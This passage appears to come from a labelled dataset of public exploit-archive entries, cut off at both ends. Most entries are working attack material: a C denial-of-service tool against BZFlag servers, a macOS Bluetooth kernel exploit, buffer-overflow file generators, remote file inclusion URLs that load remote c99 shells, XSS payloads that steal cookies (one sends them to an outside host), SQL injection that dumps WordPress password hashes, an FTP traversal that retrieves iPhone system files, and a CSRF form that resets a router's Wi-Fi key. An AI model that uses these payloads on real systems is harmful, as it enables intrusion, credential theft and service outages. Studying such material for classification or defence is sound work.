http://192.168.1.1/corporate/webpages/index.php Cookie: JSESSIONID=120g9lzj467ivba7uvbf9ej73 Connection: close  Response:  HTTP/1.1 200 OK Date: Wed, 31 Aug 2016 06:59:56 GMT X-Frame-Options: SAMEORIGIN Content-Type: text/html;charset=UTF-8 Cache-Control: max-age=2592000 Expires: Fri, 30 Sep 2016 06:59:56 GMT Vary: Accept-Encoding Content-Length: 1828 Connection: Close  ...  <table width=""100%"" cellpading=""1"" cellspacing=""1""> <tr> <td class=""tableheader_gadget"" align=""center""><label id='Language.Time'></label></td> <td class=""tableheader_gadget"" align=""center""><label id='Language.User'></label></td> ...  Affected URLs =============== http://192.168.1.1/corporate/webpages/dashboard/ApplianceInformation.jsp http://192.168.1.1/corporate/webpages/dashboard/IPSRecentAlerts.jsp http://192.168.1.1/corporate/webpages/dashboard/HTTPVirusDetected.jsp ...Many others...   References =============== https://infosecninja.blogspot.co.nz/2017/04/cve-2016-7786-sophos-cyberoam-utm.html https://vuldb.com/?id.99371 https://www.cvedetails.com/cve/CVE-2016-7786/ https://nvd.nist.gov/vuln/detail/CVE-2016-7786",Direct Object Reference Description,1
5349,"Microsoft Visual InterDev 6.0 SP6 - '.sln' Local Buffer Overflow (PoC) #usage: exploit.py FileName  import sys  print ""--------------------------------------------------------------------------------"" print ' [PoC 2] Microsoft Visual InterDev 6.0 (SP6) "".sln"" files Local Buffer Overflow' print "" author: shinnai"" print "" mail: shinnai[at]autistici[dot]org"" print "" site: http://shinnai.altervista.org\n"" print "" Execution of arbitrary code is possible, but it annoys me at the moment :)"" print ""--------------------------------------------------------------------------------""  buff      = ""a"" * 264 + ""bbbb"" + ""c"" * 256  try:     sln_file = \         'Microsoft Visual Studio Solution File, Format Version 1.00\n'+\         'Project(""{}"") = ""' + buff + '""\n'+\          'EndProject\n'          out_file = open(sys.argv[1] + "".sln"",'w')     out_file.write(sln_file)     out_file.close()     print ""\nFILE CREATION COMPLETED!\n"" except:     print "" \n -------------------------------------""     print ""  Usage: exploit.py FileName""     print "" -------------------------------------""     print ""\nAN ERROR OCCURS DURING FILE CREATION!""  # milw0rm.com [2008-04-03]",Local Buffer Overflow,1
16229,"iOS myDBLite 1.1.10 - Directory Traversal # Exploit Title : myDBLite v1.1.10 for iPhone / iPod touch, Directory Traversal  # Date: 02/24/2011 # Author: R3d@l3rt, Sp@2K, Sp@2K, Sunlight, H@ckk3y # Software Link: http://itunes.apple.com/kr/app/mydb-lite/id335521112?mt=8 # Version: 1.1.10 # Tested on: iPhone, iPod 3GS with 4.2.1 firmware    # There is directory traversal vulnerability in the myDBLite.   # Exploit Testing  C:\>ftp ftp> open 192.168.0.70 29161 Connected to 192.168.0.70. 220 DiddyDJ FTP server ready. User (192.168.0.70:(none)): anonymous 331 Password required for anonymous Password: 230 User  logged in. ftp> dir 200: PORT command successful. 150: Opening ASCII mode data connection for '/bin/ls'.  -rw-r--r--     1 mobile mobile        429 1??09 10:55 appConfig.plist -rw-r--r--     1 mobile mobile        429 1??09 10:55 appConfigInit.plist -rw-r--r--     1 mobile mobile        899 1??09 10:55 appData.plist -rw-r--r--     1 mobile mobile        899 1??09 10:55 appDataInit.plist -rw-r--r--     1 mobile mobile       9859 1??09 10:55 astonmartin.jpg -rw-r--r--     1 mobile mobile         20 1??09 10:55 astonmartin.txt -rw-r--r--     1 mobile mobile      11128 1??09 10:55 ferrari.jpg -rw-r--r--     1 mobile mobile         74 1??09 10:55 ferrari.txt -rw-r--r--     1 mobile mobile      32797 1??09 10:55 frey.jpg -rw-r--r--     1 mobile mobile      17553 1??09 10:55 porsche.jpg -rw-r--r--     1 mobile mobile        111 1??09 10:55 porsche.txt -rw-r--r--     1 mobile mobile        422 2??24 15:20 pswd.bkup -rw-r--r--     1 mobile mobile        422 2??24 15:21 pswd.plist -rw-r--r--     1 mobile mobile      54378 1??09 10:55 schinznach.jpg drwxr-xr-x    12 mobile mobile        476 1??04 14:43 secret  226 Transfer complete. ftp: 1044 bytes received in 0.02Seconds 65.25Kbytes/sec. ftp> cd ../../../../../../ 250 CWD command successful. ftp> dir 200: PORT command successful. 150: Opening ASCII mode data connection for '/bin/ls'.  -rwxr-xr-x    40 root admin         30 10??26 01:20 Applications drwxrwxr-x     1 root admin         68 8??19 04:10 Developer drwxrwxr-x    24 root admin        884 1??12 12:53 Library drwxr-xr-x     1 root wheel        102 8??19 04:18 System -rwxr-xr-x     7 root admin         11 2??23 19:41 User drwxr-xr-x    59 root wheel       2074 1??13 09:52 bin drwxr-xr-x     1 root admin         68 10??26 01:19 boot -rw-r--r--     1 (null) (null)        638 1??25 15:30 control drwxrwxr-x     1 root admin         68 8??03 12:41 cores ----------     1 (null) (null)          0 (null) dev -rwxr-xr-x    25 root admin         11 8??26 05:20 etc drwxr-xr-x     1 root admin         68 10??26 01:19 lib drwxr-xr-x     1 root admin         68 10??26 01:19 mnt drwxr-xr-x     2 root wheel        136 10??23 15:12 private drwxr-xr-x    47 root wheel       1666 1??13 09:52 sbin -rwxr-xr-x     5 root admin         15 8??26 05:20 tmp drwxr-xr-x     9 root wheel        374 1??13 09:52 usr -rwxr-xr-x    26 root admin         11 8??26 05:20 var  226 Transfer complete. ftp: 1128 bytes received in 0.02Seconds 70.50Kbytes/sec. ftp> get ../../../../../etc/passwd 200: PORT command successful. 150: Opening BINARY mode data connection for '../../../../../etc/passwd'. 226 Transfer complete. ftp: 787 bytes received in 0.00Seconds 787000.00Kbytes/sec. ftp> get ../../../../../../private/var/mobile/Library/Preferences/com.apple.conference.plist 200: PORT command successful. 150: Opening BINARY mode data connection for '../../../../../../private/var/mobile/Library/Preferences/com.apple.conference.plist'. 226 Transfer complete. ftp: 272 bytes received in 0.00Seconds 272000.00Kbytes/sec. ftp> quit 221- Data traffic for this session was 0 bytes in 0 files  C:\>type passwd # # 4.3BSD-compatable User Database # # Note that this file is not consulted for login. # It only exisits for compatability with 4.3BSD utilities. # # This file is automatically re-written by various system utilities. # Do not edit this file.  Changes will be lost. # nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false root:*:0:0:System Administrator:/var/root:/bin/sh mobile:*:501:501:Mobile User:/var/mobile:/bin/sh daemon:*:1:1:System Services:/var/root:/usr/bin/false _wireless:*:25:25:Wireless Services:/var/wireless:/usr/bin/false _securityd:*:64:64:securityd:/var/empty:/usr/bin/false _mdnsresponder:*:65:65:mDNSResponder:/var/empty:/usr/bin/false _sshd:*:75:75:sshd Privilege separation:/var/empty:/usr/bin/false _unknown:*:99:99:Unknown User:/var/empty:/usr/bin/false  C:\>type com.apple.conference.plist bplist00?_restoredFromBackup\natTypeCache? _DIPv4.Router=192.168.0.1;IPv4.RouterHardwareAddress=1c:bd:b9:XX:XX:XX_EIPv4.R outer=192.168.11.1;IPv4.RouterHardwareAddress=00:24:a5:XX:XX:XX? XnatFlag C:\>    # IPhone inside information  1. Phone Book  - /private/var/mobile/Library/AddressBook/AddressBook.sqlitedb       2. Safari Favorites List  - /private/var/mobile/Library/Safari  3. Users E-mail Information  - /private/var/mobile/Library/Preferences/com.apple.accountsettings.plist  4. IPv4 Router Information  - /private/var/mobile/Library/Preferences/com.apple.conference.plist",Directory Traversal,1
4102,b1gbb 2.24.0 - 'footer.inc.php?tfooter' Remote File Inclusion # b1gBB (b1g Bulletion Board) (footer.inc.php) Remote File Inclusion Vulnerabilities  # D.Script :      http://switch.dl.sourceforge.net/sourceforge/b1gbb/b1gbb-2.24.0.zip  # V.Code :      include $tfooter  # In :      footer.inc.php  # Exploits : http://www.name/path/footer.inc.php?tfooter=shell?   # Discovered by:      Rf7awy x59@hotmail.it  thanks Mahmood_ali  # Homepage:      http://www.Tryag.Com/cc  # Sp.Thanx To :      Tryag-Team  # milw0rm.com [2007-06-25],Remote File Inclusion,1
26098,"FlatNuke 2.5.5 - 'structure.php' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/14483/info  FlatNuke is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.  An attacker can exploit these vulnerabilities to inject html and script code into the Web browser of an unsuspecting victim.The attacker may then steal cookie-based authentication credentials. Other attacks are also possible.   http://[target]/[path]/themes/butterfly/structure.php?bodycolor=""><script>alert(document.cookie)</script> http://[target]/[path]/themes/butterfly/structure.php?backimage=""><script>alert(document.cookie)</script> http://[target]/[path]/themes/butterfly/structure.php?backimage=whatever&theme=""><script>alert(document.cookie)</script> http://[target]/[path]/themes/butterfly/structure.php?backimage=whatever&bodycolor=""><script>alert(document.cookie)</script> http://[target]/[path]/themes/butterfly/structure.php?logo=""><script>alert(document.cookie)</script>",Cross-Site Scripting,1
13751,"greeting card - Arbitrary File Upload # Exploit Title: [greeting card Remote Upload Vulnerability] # Date: [04/06/2010] # Author: [Mr.Benladen] # Software Link: [N/A] # Version: [2004/2008] # Tested on: [Linux/unix] # CVE : [if exists] # Code : [N/A] #Email : MaFiadu48@hotmail.fr  ############################## ########################################################################  # # # # # # # # # # # # # ## #### ## # ## ## ###### ## ## ## ## ###### ## ## ## ## #### ## ## ### ############ ### ######################## Mr.Benladen cr3w ############## ######## ########## ####### ### ## ########## ## ### ### ## ########## ## ### ### # ########## # ### ### ## ######## ## ### ## # ###### # ## ## # #### # ## ## ##  ######################################################################################################  [Dork ]: ""Send amazing greetings to your friends and relative!""  {exploit} : http://127.0.0.1/upload.php  First register and the site and go to upload cards  After you have uploaded your shells , you will find it in this Path : http://[site]//cards/id_thumb_evil.php  demo : http://server/cards/1275663706_thumb_oujda.php  ######################################################################################################   Greetz To : Federal7-blackroot-khalidmoro-ra3ch-yesmouh-Zi00n From Ukrania-Dr.Prorat all My Friend  and al muslim h4x0r  M0r0Can Is Here  --=-=-=-=-www.Joomlaservice.info <http://www.joomlaservice.info/> or www.dz4all.com -=-=-=-=--=",Arbitrary File Upload,1
26891,"Light Audio Mixer 1.0.12 - '.wav' Crash (PoC) # Exploit Title: Light Audio Mixer Version 1.0.12 (.wav) - Crash POC # Date: 14-07-2013 # Exploit Author: ariarat # Software Link: http://download.cnet.com/Light-Audio-Mixer/3000-2139_4-10791607.html # Version: 1.0.12 # Tested on: [ Windows XP sp3] #============================================================================================ # After creating PoC file.(.wav),drag it to Play List and choose a Deck(if present) and press OK! #============================================================================================ # Contact : #------------------ # Web Page : http://ariarat.blogspot.com # Email    : mehdi.esmaeelpour@gmail.com #============================================================================================  #!/usr/bin/python  string=(""\x2E\x73\x6E\x64\x00\x00\x01\x18\x00\x00\x42\xDC\x00\x00\x00\x01"" ""\x00\x00\x1F\x40\x00\x00\x00\x00\x69\x61\x70\x65\x74\x75\x73\x2E"" ""\x61\x75\x00\x20\x22\x69\x61\x70\x65\x74\x75\x73\x2E\x61\x75\x22"" ""\x00\x31\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"")  filename = ""PoC.wav"" file = open(filename , ""w"") file.write(string) file.close()",Crash,1
4079,"MiniBill 1.2.5 - 'run_billing.php' Remote File Inclusion ======================================================= MiniBill 2007-04-09 (v1.2.5) Remote File include Vulnerabilities ======================================================= Found By : Abo0od , abod@islam-attack.com ======================================================= Homepage: http://www.hack-teach.org/cc ======================================================= Script Site : http://www.ultrize.com/minibill/index.php?page=download ======================================================= File: /crontab/run_billing.php <= $config['include_dir'] ======================================================== Exploit: site.com/crontab/run_billing.php?config[include_dir]=Evil-script.txt? ======================================================= greets to : www.islam-attack.com =======================================================  # milw0rm.com [2007-06-18]",Remote File Inclusion,1
1390,"BZFlag 2.0.4 - undelimited string Denial of Service /*  by Luigi Auriemma  */  #include <stdio.h> #include <stdlib.h> #include <string.h> #include <stdarg.h> #include <time.h>  #ifdef WIN32     #include <winsock.h> /*    Header file used for manage errors in Windows    It support socket and errno too    (this header replace the previous sock_errX.h) */  #include <string.h> #include <errno.h>    void std_err(void) {     char    *error;      switch(WSAGetLastError()) {         case 10004: error = ""Interrupted system call""; break;         case 10009: error = ""Bad file number""; break;         case 10013: error = ""Permission denied""; break;         case 10014: error = ""Bad address""; break;         case 10022: error = ""Invalid argument (not bind)""; break;         case 10024: error = ""Too many open files""; break;         case 10035: error = ""Operation would block""; break;         case 10036: error = ""Operation now in progress""; break;         case 10037: error = ""Operation already in progress""; break;         case 10038: error = ""Socket operation on non-socket""; break;         case 10039: error = ""Destination address required""; break;         case 10040: error = ""Message too long""; break;         case 10041: error = ""Protocol wrong type for socket""; break;         case 10042: error = ""Bad protocol option""; break;         case 10043: error = ""Protocol not supported""; break;         case 10044: error = ""Socket type not supported""; break;         case 10045: error = ""Operation not supported on socket""; break;         case 10046: error = ""Protocol family not supported""; break;         case 10047: error = ""Address family not supported by protocol family""; break;         case 10048: error = ""Address already in use""; break;         case 10049: error = ""Can't assign requested address""; break;         case 10050: error = ""Network is down""; break;         case 10051: error = ""Network is unreachable""; break;         case 10052: error = ""Net dropped connection or reset""; break;         case 10053: error = ""Software caused connection abort""; break;         case 10054: error = ""Connection reset by peer""; break;         case 10055: error = ""No buffer space available""; break;         case 10056: error = ""Socket is already connected""; break;         case 10057: error = ""Socket is not connected""; break;         case 10058: error = ""Can't send after socket shutdown""; break;         case 10059: error = ""Too many references, can't splice""; break;         case 10060: error = ""Connection timed out""; break;         case 10061: error = ""Connection refused""; break;         case 10062: error = ""Too many levels of symbolic links""; break;         case 10063: error = ""File name too long""; break;         case 10064: error = ""Host is down""; break;         case 10065: error = ""No Route to Host""; break;         case 10066: error = ""Directory not empty""; break;         case 10067: error = ""Too many processes""; break;         case 10068: error = ""Too many users""; break;         case 10069: error = ""Disc Quota Exceeded""; break;         case 10070: error = ""Stale NFS file handle""; break;         case 10091: error = ""Network SubSystem is unavailable""; break;         case 10092: error = ""WINSOCK DLL Version out of range""; break;         case 10093: error = ""Successful WSASTARTUP not yet performed""; break;         case 10071: error = ""Too many levels of remote in path""; break;         case 11001: error = ""Host not found""; break;         case 11002: error = ""Non-Authoritative Host not found""; break;         case 11003: error = ""Non-Recoverable errors: FORMERR, REFUSED, NOTIMP""; break;         case 11004: error = ""Valid name, no data record of requested type""; break;         default: error = strerror(errno); break;     }     fprintf(stderr, ""\nError: %s\n"", error);     exit(1); }  // combined winerr.h /str0ke      #define close   closesocket #else     #include <unistd.h>     #include <sys/socket.h>     #include <sys/types.h>     #include <arpa/inet.h>     #include <netinet/in.h>     #include <netdb.h> #endif    #define VER         ""0.1"" #define BUFFSZ      0xffff #define PORT        5154 #define TIMEOUT     8  #define WAITSEC     5 #define CALLSIGNSZ  32 #define MAILSZ      128 #define TOKENSZ     22 #define VERSIONSZ   60 #define TYPE        ""\x00\x00"" #define TEAM        ""\xff\xfe""  // autoteam    int bzflag_send(int sd, u_char *buff, u_char *code, ...); int tcp_recv(int sd, u_char *data, int len); u_short bzflag_recv(int sd, u_char *buff, u_char *code); int create_rand_string(u_char *data, int len, u_int *seed); int timeout(int sock, int secs); u_int resolv(char *host); void std_err(void);    int main(int argc, char *argv[]) {     struct  sockaddr_in peer;     u_int   seed;     int     sd;     u_short port = PORT,             len;     u_char  buff[BUFFSZ],             callsign[CALLSIGNSZ + 1],             mail[MAILSZ + 1],             token[TOKENSZ + 1],             version[VERSIONSZ + 1],             code[2];  #ifdef WIN32     WSADATA    wsadata;     WSAStartup(MAKEWORD(1,0), &wsadata); #endif       setbuf(stdout, NULL);      fputs(""\n""         ""BZFlag <= 2.0.4 (2.x) server crash ""VER""\n""         ""by Luigi Auriemma\n""         ""e-mail: aluigi@autistici.org\n""         ""web:    http://aluigi.altervista.org\n""         ""\n"", stdout);      if(argc < 2) {         printf(""\n""             ""Usage: %s <host> [port(%hu)]\n""             ""\n""             "" This tool works also versus servers protected by password without knowing the\n""             "" keyword!\n""             ""\n"", argv[0], port);         exit(1);     }      if(argc > 2) port = atoi(argv[2]);      peer.sin_addr.s_addr = resolv(argv[1]);     peer.sin_port        = htons(port);     peer.sin_family      = AF_INET;      printf(""- target   %s : %hu\n"",         inet_ntoa(peer.sin_addr), port);      fputs(""- check server version: "", stdout);     sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);     if(sd < 0) std_err();     if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))       < 0) std_err();     if(timeout(sd, TIMEOUT) < 0) {         printf(""\nError: no reply received within %d seconds, this server doesn't seem valid\n\n"", TIMEOUT);         exit(1);     }     tcp_recv(sd, buff, 9);      printf(""   %s\n"", buff);     if(memcmp(buff, ""BZFS"", 4)) {         fputs(""- this server doesn't seem a valid BZFlag server, I try to continue\n"", stdout);     } else {         if(memcmp(buff + 4, ""00"", 2)) {             fputs(""- this server uses a version which is not vulnerable, I try to continue\n"", stdout);         }     }      if(!timeout(sd, 0)) {   // 2.0.4 sends data while the previous 2.0 not         len = bzflag_recv(sd, buff, code);     }      create_rand_string(callsign, CALLSIGNSZ, &seed);    // <=== THE BUG IS HERE     create_rand_string(mail,     MAILSZ,     &seed);     create_rand_string(token,    TOKENSZ,    &seed);     create_rand_string(version,  VERSIONSZ,  &seed);      bzflag_send(sd,         buff,         ""en"",         2,          TYPE,         2,          TEAM,         CALLSIGNSZ, callsign,         MAILSZ,     mail,         TOKENSZ,    token,         VERSIONSZ,  version,         0);      len = bzflag_recv(sd, buff, code);      if(memcmp(code, ""ac"", 2)) {         buff[len] = 0;         printf(""\n""             ""Error: code \""%.2s\""\n""             ""%s\n""             ""\n"",             code, buff + 2);     }      close(sd);      fputs(""- check server:\n"", stdout);     sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);     if(sd < 0) std_err();     if(       (connect(sd, (struct sockaddr *)&peer, sizeof(peer)) < 0) ||       (timeout(sd, 3) < 0)) {         fputs(""\n  Server IS vulnerable!!!\n\n"", stdout);     } else {         fputs(""\n""             ""  Server doesn't seem vulnerable\n""             ""  RELAUNCH THIS TOOL OTHER TIMES UNTIL YOU ARE UNABLE TO CRASH IT!!!\n""             ""\n"", stdout);     }     close(sd);     return(0); }    int bzflag_send(int sd, u_char *buff, u_char *code, ...) {     va_list ap;     int     len;     u_short *blen;     u_char  *s,             *p;      blen = (u_short *)buff;     memcpy(buff + 2, code, 2);     p = buff + 4;      va_start(ap, code);     while((len = va_arg(ap, int))) {         s = va_arg(ap, u_char *);         memcpy(p, s, len);         p += len;     }     va_end(ap);      *blen = htons(p - (buff + 4));      len = send(sd, buff, p - buff, 0);     return(len); }    int tcp_recv(int sd, u_char *data, int len) {     int     t;      while(len) {         t = recv(sd, data, len, 0);         if(t <= 0) return(-1);         data += t;         len  -= t;     }      return(0); }    u_short bzflag_recv(int sd, u_char *buff, u_char *code) {     u_short len;      tcp_recv(sd, (u_char *)&len, 2);     len = ntohs(len);      tcp_recv(sd, code, 2);      tcp_recv(sd, buff, len);      return(len); }    int create_rand_string(u_char *data, int len, u_int *seed) {     u_int   rnd;     u_char  *p = data;     const static u_char table[] =                 ""0123456789""                 ""ABCDEFGHIJKLMNOPQRSTUVWXYZ""                 ""abcdefghijklmnopqrstuvwxyz"";      rnd = *seed; //    len = rnd % len;  // max length! //    if(len < 3) len = 3;      while(len--) {         rnd = (rnd * 0x343FD) + 0x269EC3;         *p++ = table[rnd % (sizeof(table) - 1)];     }     *p = 0;      *seed = rnd;     return(p - data); }    int timeout(int sock, int secs) {     struct  timeval tout;     fd_set  fd_read;     int     err;      tout.tv_sec  = secs;     tout.tv_usec = 1000;    // in case secs is 0     FD_ZERO(&fd_read);     FD_SET(sock, &fd_read);     err = select(sock + 1, &fd_read, NULL, NULL, &tout);     if(err < 0) std_err();     if(!err) return(-1);     return(0); }    u_int resolv(char *host) {     struct hostent *hp;     u_int host_ip;      host_ip = inet_addr(host);     if(host_ip == INADDR_NONE) {         hp = gethostbyname(host);         if(!hp) {             printf(""\nError: Unable to resolv hostname (%s)\n"", host);             exit(1);         } else host_ip = *(u_int *)hp->h_addr;     }     return(host_ip); }    #ifndef WIN32     void std_err(void) {         perror(""\nError"");         exit(1);     } #endif  // milw0rm.com [2005-12-27]",undelimited string Denial of Service,1
5173,"phpQLAdmin 2.2.7 - Multiple Remote File Inclusions # Name : phpQLAdmin 2.2.7  Multiple Remote File Include # Download From : http://phpqladmin.com/phpQLAdmin-2.2.7.zip # Found By : RoMaNcYxHaCkEr     [RoMaNTiC-TeaM]           # Home Page :  WwW.4RxH.CoM   +============================================================================+ # Vulne Code In Files ezmlm.php & update_translations.php # Exploit : http://www.4rxh.com/phpQLAdmin-2.2.7/ezmlm.php?_SESSION[path]=http://rxh.freehostia.com/shells/c99in.txt? http://www.4rxh.com/tools/update_translations.php?_SESSION[path]=http://rxh.freehostia.com/shells/c99in.txt?  That,s It,s Good Luck Everybody +============================================================================+ # Greet To : Tryag TeaM & All Members Of My Forum # For Contact : RxH@HotMail.iT # Note : Yesterday I Help You !! Tomorrow Fuck Me !!! Fuck All Snitches !!! But Do You Know What !!! That,s Is My Mistake Best Wishes  # milw0rm.com [2008-02-22]",Remote File Inclusions,1
35774,"Apple Mac OSX 10.10 - BlueTooth DispatchHCIWriteStoredLinkKey Crash (PoC) /*  * lpe-issue1.c  * Written for Mac OS X Yosemite (10.10.1) by @joystick and @rpaleari.  *  * Exploits IOBluetoothHCIUserClient::DispatchHCIWriteStoredLinkKey()  *  * gcc -Wall -o lpe-issue1{,.c} -framework IOKit  *  */  #include <stdio.h> #include <stdlib.h> #include <string.h> #include <mach/mach.h> #include <mach/vm_map.h>  #include <IOKit/IOKitLib.h>  #define SIZE 0x1000  struct BluetoothCall {   uint64_t args[7];   uint64_t sizes[7];   uint64_t index; };  #ifndef bswap64 #   define bswap64(num)							\   ( (((uint64_t)(num) << 56)                               )		\     | (((uint64_t)(num) << 40) & UINT64_C(0x00FF000000000000))		\     | (((uint64_t)(num) << 24) & UINT64_C(0x0000FF0000000000))		\     | (((uint64_t)(num) <<  8) & UINT64_C(0x000000FF00000000))		\     | (((uint64_t)(num) >>  8) & UINT64_C(0x00000000FF000000))		\     | (((uint64_t)(num) >> 24) & UINT64_C(0x0000000000FF0000))		\     | (((uint64_t)(num) >> 40) & UINT64_C(0x000000000000FF00))		\     | (((uint64_t)(num) >> 56)                               ) ) #endif  void create_requests(io_connect_t port) {   struct BluetoothCall a;   uint32_t i;   kern_return_t kr;    for (i = 0; i < 7; i++) {     a.args[i] = (uint64_t) calloc(SIZE, sizeof(char));     a.sizes[i] = SIZE;   }    /* DispatchHCIRequestCreate() */   a.index = 0x0;    *(uint64_t *)a.args[0] = 5*1000;  /* Timeout */   memset((void *)a.args[1], 0x81, 0x1000);   memset((void *)a.args[2], 0x82, 0x1000);   memset((void *)a.args[3], 0x83, 0x1000);   memset((void *)a.args[4], 0x84, 0x1000);   memset((void *)a.args[5], 0x85, 0x1000);   memset((void *)a.args[6], 0x86, 0x1000);    for(i = 0; i < 500; i++) {     kr = IOConnectCallMethod((mach_port_t) port, /* Connection */ 			     (uint32_t) 0,       /* Selector */ 			     NULL, 0,            /* input, inputCnt */ 			     (const void*) &a,   /* inputStruct */ 			     120,                /* inputStructCnt */ 			     NULL, NULL, NULL, NULL); /* Output stuff */      if(kr == 0xe00002bd) /* Full */       break;   } }  int main(void) {   struct BluetoothCall a;   int i;   void *landing_page = calloc(SIZE, sizeof(char));    /* Init a */   for (i = 0; i < 7; i++) {     a.args[i] = (uint64_t) calloc(SIZE, sizeof(char));     a.sizes[i] = SIZE;   }    /* Finding vuln service */   io_service_t service =     IOServiceGetMatchingService(kIOMasterPortDefault, 				IOServiceMatching(""IOBluetoothHCIController""));    if (!service) {     return -1;   }    /* Connect to vuln service */   io_connect_t port = (io_connect_t) 0;   kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &port);   IOObjectRelease(service);   if (kr != kIOReturnSuccess) {     return kr;   }    /* Populating with fake requests. */   create_requests(port);    /* IOBluetoothHCIUserClient::DispatchHCIWriteStoredLinkKey() */   a.index = 42;   /* Req number */   *((uint32_t *)a.args[0]) = 1;   /* num_of_keys */   *((uint32_t *)a.args[1]) = 0x20;    /* Padding */   memset((void *)a.args[3], 0x33, 152);   /* mov     rdi, [r14+0AB8h] */   *((uint64_t *)(a.args[3]+152)) = bswap64((uint64_t)landing_page);   /* mov rax, [rdi] */   *((uint64_t *)((uint64_t)landing_page)) = (uint64_t)landing_page;   /* call [rax+0x1d0]: this will trigger a #GP calling 0x4141414142424242 */   *((uint64_t *)((uint64_t)landing_page+0x1d0)) = (uint64_t) 0x4141414142424242;    /* Here some fixing to the vtable is required to return cleanly after the exploit */  #if 0   /* Debug print */   for(i = 0; i < 120; i++) {     if(i % 8 == 0) printf(""\n"");     printf(""\\x%02x"", ((unsigned char *)&a)[i]);   }   printf(""\n""); #endif    kr = IOConnectCallMethod((mach_port_t) port, /* Connection */ 			   (uint32_t) 0,       /* Selector */ 			   NULL, 0,            /* input, inputCnt */ 			   (const void*) &a,   /* inputStruct */ 			   120,                /* inputStructCnt */ 			   NULL, NULL, NULL, NULL); /* Output stuff */   printf(""kr: %08x\n"", kr);    return IOServiceClose(port); }",Crash,1
31212,"Yellow Swordfish Simple Forum 1.x - 'topic' SQL Injection source: https://www.securityfocus.com/bid/27825/info  Simple Forum is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  http://www.example.com/?page_id=xxxx&forum=S@BUN&topic=-1%2F%2A%2A%2Funion%2F%2A%2A%2Fselect/**/0,concat(0x7c,user_login,0x7c,user_pass,0x7c),111,222,333,0,0,0,0,0/**/from%2F%2A%2A%2Fwp_users/**where%20id%201%20=%20-1",SQL Injection,1
11396,"vBulletin 2.3.x - SQL Injection # Title: vbulletin Vulnerability versions 2.3 .* - SQL injection. # Author: Discovered by ROOT_EGY # Version: vBulletin Version 2.3  ===========================================================                      www.sec-war.com ===========================================================   Vulnerability versions 2.3 .* - SQL injection in the validation of input data in 'calendar.php'. Sends SQL requests to the server. For example: www.server.som/forumpath/calendar.php?s=&action=edit&eventid=14 union (SELECT allowsmilies, public, userid, '0000-0-0 ', version (), userid FROM calendar_events WHERE eventid = 14) order by eventdate Vulnerability to Version 2 .*.* - is introducing XSS script tag e-mail [E * MAIL] aaa@aaa.aa » 's =' [/ E * MAIL] 'sss =» i = new Image (); i.src =' http://antichat.ru/cgi-bin/s . jpg? '+ document.cookie; this.sss = null »style = top: expression (eval (this.sss));    ===========================================================  ROOT_EGY  to connect: r0t@hotmail.es  ===========================================================  Greetz TO : Alnjm33 - Mr.xXx - EgY-Sn!per - red virus - ShOot3r - And All My Friends.  ===========================================================",SQL Injection,1
46580,"PLC Wireless Router GPN2.4P21-C-CN - Incorrect Access Control # Exploit Title: PLC Wireless Router GPN2.4P21-C-CN -Incorrect Access Control # Date: 14/01/2019 # Exploit Author: Kumar Saurav # Reference: https://0dayfindings.home.blog/2019/01/15/plc-wireless-router-gpn2-4p21-c-cn-incorrect-access-control/ # Vendor: ChinaMobile # Category: Hardware # Version: GPN2.4P21-C-CN (Firmware: W2001EN-00) # Tested on: Windows # CVE : CVE-2019-6279  #Description: ChinaMobile PLC Wireless Router GPN2.4P21-C-CN devices with firmware W2001EN-00 have an Incorrect Access Control vulnerability via the cgi-bin/webproc?getpage=html/index.html subpage=wlsecurity URI, allowing an Attacker to change the Wireless Security Password.  Reproduction Steps: Step 1: Building a malicious html web page Step 2: Attacker’s wants to change the wireless security (WPA/WPA2) key to “PSWDmatlo331#@!” (in my case)  Step 3: (192.168.59.254 in my Case) <html> <body> <form method=”POST” action=”http://192.168.59.254:80/cgi-bin/webproc “> <input type=”text” name=”sessionid” value=”2a39a09e”> <input type=”text” name=”language” value=”en_us”> <input type=”text” name=”sys_UserName” value=”admin”> <input type=”text” name=”var:menu” value=”setup”> <input type=”text” name=”var:page” value=”wireless”> <input type=”text” name=”var:subpage” value=”wlsecurity”> <input type=”text” name=”var:errorpage” value=”wlsecurity”> <input type=”text” name=”getpage” value=”html/index.html”> <input type=”text” name=”errorpage” value=”html/index.html”> <input type=”text” name=”var:arrayid” value=”0?> <input type=”text” name=”obj-action” value=”set”> <input type=”text” name=”:InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.BeaconType ” value=”11i”> <input type=”text” name=”:InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.IEEE11iEncryptionModes” value=”AESEncryption”> <input type=”text” name=”:InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.IEEE11iAuthenticationMode” value=”PSKAuthentication”> <input type=”text” name=”:InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.X_TWSZ-COM_WPAGroupRekey” value=”100?> <input type=”text” 